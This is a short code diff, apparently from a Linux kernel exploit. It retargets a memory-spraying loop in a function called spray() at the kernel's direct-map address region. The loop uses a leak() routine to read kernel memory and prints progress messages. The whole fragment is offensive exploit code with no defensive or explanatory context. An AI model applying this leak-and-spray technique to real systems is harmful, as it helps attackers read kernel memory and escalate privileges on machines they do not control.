@@ -142,7 +142,7 @@ static u64 spray() {
     u64 addr;
     char *tmp, *buf = malloc(len);
 
-    for(addr = heap_base; addr < 0xfffffffffff00000; addr += len) {
+    for(addr = 0xffff888000000000; addr < 0xfffff88000000000; addr += len) {
         if(addr % 0x10000000000 == 0) printf("[+] spraying: %p\n", addr);
 
         if(leak(buf, (char *)addr, len) != 0) continue;
